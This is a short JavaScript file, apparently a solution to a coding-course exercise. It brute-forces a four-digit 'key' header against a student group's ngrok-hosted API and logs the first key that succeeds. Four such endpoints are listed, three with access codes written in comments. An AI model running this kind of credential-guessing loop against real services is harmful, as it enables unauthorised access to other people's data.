import axios from "axios"

const endpoints = [
  "https://7758-2001-b07-a9a-89a8-fc69-90ae-c7c4-8dbc.ngrok-free.app/digitazon/2023/02/group/1/students",
  "https://b6a4-37-162-141-71.ngrok-free.app/digitazon/2023/02/group/2/students", // Codice 0876
  "https://878f-151-33-19-106.ngrok-free.app/digitazon/2023/02/group/3/students", // Codice 2023
  "https://5f00-212-24-20-117.eu.ngrok.io/digitazon/2023/02/group/4/students" // Codide 0020
]

async function tryAllCombinations() {
    for (let i = 0; i < 10000; i++) {
        const key = i.toString().padStart(4, "0")
        const headers = {
            key: key
        }
        try {
            const response = await axios.get(
                "https://b6a4-37-162-141-71.ngrok-free.app/digitazon/2023/02/group/2/students",
                { headers }
            )
            console.log("Key valida:", key)
            console.log("Risposta:", response.data)
            break
        } catch (error) {
            console.log("Key non valida:", key, error.response.status)
        }
    }
}
tryAllCombinations()

// SOLUZIONE DI ALBERTO
